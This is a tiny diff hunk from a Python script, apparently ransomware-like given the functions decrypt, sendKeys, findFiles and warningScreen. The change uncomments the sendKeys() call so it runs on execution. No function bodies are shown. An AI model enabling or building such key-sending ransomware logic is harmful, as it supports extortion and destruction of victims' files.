@@ -112,6 +112,6 @@ def decrypt():
         
 if __name__ == "__main__":
     
-    # sendKeys()
+    sendKeys()
     findFiles()
     warningScreen()
